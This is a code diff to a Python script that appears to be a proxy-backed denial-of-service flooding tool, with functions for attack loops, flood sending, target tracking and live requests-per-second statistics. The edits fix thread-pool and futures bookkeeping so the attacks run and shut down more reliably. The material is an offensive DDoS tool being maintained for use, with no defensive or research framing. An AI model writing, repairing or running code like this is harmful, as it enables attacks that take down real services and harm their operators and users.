@@ -195,11 +195,12 @@ last_proxy_refresh = 0
 attacks_paused = False
 discovered_ips_cache = {}
 
-# Thread pool
+# Thread pool - FIXED GLOBAL DECLARATIONS
 attack_thread_pool = None
 thread_pool_lock = threading.Lock()
 active_futures = set()
 future_lock = threading.Lock()
+active_futures_count = 0  # Added to track count without set iteration issues
 
 # Advanced tracking
 response_tracking = defaultdict(lambda: {"count": 0, "status_codes": defaultdict(int), "blocked": 0})
@@ -223,9 +224,15 @@ def init_thread_pool():
 
 def shutdown_thread_pool():
     """Shutdown the thread pool"""
-    global attack_thread_pool
+    global attack_thread_pool, active_futures, active_futures_count
     with thread_pool_lock:
         if attack_thread_pool:
+            # Cancel all futures
+            with future_lock:
+                for future in list(active_futures):
+                    future.cancel()
+                active_futures.clear()
+                active_futures_count = 0
             attack_thread_pool.shutdown(wait=False, cancel_futures=True)
             attack_thread_pool = None
             print("[*] Thread pool shutdown")
@@ -1018,12 +1025,12 @@ def send_flood_safe(target_ip, target_port, method, target_key):
                     
             except Exception:
                 pass
-    except Exception as e:
+    except Exception:
         pass
 
 def attack_loop_thread_pool(target_ip, target_port, method, target_label):
     """Attack loop using thread pool - FIXES 'can't start new thread' error"""
-    global active_attacks
+    global active_attacks, active_futures, active_futures_count
     
     target_key = f"{target_ip}:{target_port}:{method}"
     with target_lock:
@@ -1048,6 +1055,7 @@ def attack_loop_thread_pool(target_ip, target_port, method, target_label):
         future = attack_thread_pool.submit(send_flood_safe, target_ip, target_port, method, target_key)
         with future_lock:
             active_futures.add(future)
+            active_futures_count += 1
     
     # Keep attack running
     while not stop_event.is_set():
@@ -1055,11 +1063,15 @@ def attack_loop_thread_pool(target_ip, target_port, method, target_label):
         with future_lock:
             completed = {f for f in active_futures if f.done()}
             active_futures -= completed
+            active_futures_count -= len(completed)
         time.sleep(5)
     
     # Cleanup
-    for future in list(active_futures):
-        future.cancel()
+    with future_lock:
+        for future in list(active_futures):
+            future.cancel()
+        active_futures.clear()
+        active_futures_count = 0
     
     with target_lock:
         if target_key in active_attacks:
@@ -1200,7 +1212,10 @@ def monitor_stats():
         proxy_count = len(PROXY_LIST)
         uptime = int(time.time() - start_time)
         
-        sys.stdout.write(f"\r[📊] RPS: {rps:,} | Total: {req_now:,} | Data: {bytes_now/(1024*1024):.1f}MB | {mbps:.2f}MB/s | Targets: {active_targets} | Proxies: {proxy_count} | Threads: {THREADS} | Uptime: {uptime//3600:02d}:{(uptime%3600)//60:02d}:{uptime%60:02d}   ")
+        with future_lock:
+            futures_count = active_futures_count
+        
+        sys.stdout.write(f"\r[📊] RPS: {rps:,} | Total: {req_now:,} | Data: {bytes_now/(1024*1024):.1f}MB | {mbps:.2f}MB/s | Targets: {active_targets} | Proxies: {proxy_count} | Threads: {THREADS} | Futures: {futures_count} | Uptime: {uptime//3600:02d}:{(uptime%3600)//60:02d}:{uptime%60:02d}   ")
         sys.stdout.flush()
         
         last_req = req_now
@@ -1290,7 +1305,7 @@ def main():
                     print(f"  CPU: {resources.get('cpu', 0):.1f}%")
                     print(f"  Memory: {resources.get('memory', 0):.1f}%")
                 with future_lock:
-                    print(f"  Active futures: {len(active_futures)}")
+                    print(f"  Active futures: {active_futures_count}")
             
             elif cmd == "stop":
                 print("[*] Stopping all attacks...")
